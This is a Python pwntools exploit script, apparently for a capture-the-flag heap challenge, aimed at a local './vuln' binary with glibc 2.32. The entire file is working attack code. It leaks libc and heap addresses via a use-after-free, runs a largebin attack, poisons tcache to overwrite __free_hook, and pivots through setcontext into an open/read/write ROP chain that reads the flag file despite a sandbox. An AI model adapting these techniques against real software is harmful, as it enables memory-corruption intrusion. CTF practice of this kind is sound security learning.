from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node3.anna.nssctf.cn",28878)
io=process("./vuln")
elf=ELF("./vuln")
libc=ELF("./libc-2.32.so")

#sandbox on  
def add(n,s):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))
    
def delete(n):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Index: ",str(n))
    
def edit(n,cc):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Index: ",str(n))
    io.sendafter(b"Content: ",cc)
    
def show(n):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"Index: ",str(n))
    
gdb.attach(io)
pause()

### leak libc
add(0,0x560) #0
add(14,0x540) #14
add(1,0x540) #1
delete(0)
edit(0,b"A")
show(0)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-65-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr: ",hex(leak_addr))
###

malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
free_hook=leak_addr+libc.sym[b"__free_hook"]
setcontext_61=leak_addr+libc.sym[b"setcontext"]+61
mprotect=leak_addr+libc.sym[b"mprotect"]
mp_=leak_addr+0x1e32d0
open_a=leak_addr+libc.sym[b"open"]
read_a=leak_addr+libc.sym[b"read"]
write_a=leak_addr+libc.sym[b"write"]
pop_rsi=leak_addr+0x2ac3f
pop_rdi=leak_addr+0x2858f
pop_rdx_r12=leak_addr+0x114161
pop_rax=leak_addr+0x45580
ret=leak_addr+0x26699

magic_gadget=leak_addr+0x14b760 
'''
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]
'''

### leak heap
edit(0,b"\x00")
add(2,0x900) #2
edit(0,b"A"*0xf+b"B")
show(0)
io.recvuntil(b"B")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x290
key=heap_addr>>12
ck_next=heap_addr+0x24d0
print("heap_addr: ",hex(heap_addr))
print("key: ",hex(key))
###


### largebin attack
payload=p64(leak_addr+libc.sym[b"__malloc_hook"]+0x70)*2
payload+=p64(mp_-0x20)*2
edit(0,payload)

delete(1)
add(3,0x900) #3
###

### hijack __free_hook
add(4,0x900) #4
add(5,0x900) #5

delete(5)
delete(4)
edit(4,p64((ck_next>>12)^free_hook))
add(4,0x900)
add(5,0x900)
edit(5,p64(magic_gadget))
###
stack_addr=heap_addr+0x36f0
orw_addr=heap_addr+0x3f00


#open
orw=p64(pop_rdi)+p64(stack_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


stack=b"./flag\x00\x00"+p64(0)*3+p64(setcontext_61)
stack=stack.ljust(0xa0,b"\x00")
stack+=p64(orw_addr)+p64(ret)

add(6,0x800) #6
edit(6,stack)

add(7,0x800) #7
edit(7,orw)

# gdb.attach(io)
# pause()

add(8,0x700) #8
edit(8,p64(0)+p64(stack_addr))
delete(8)

io.interactive()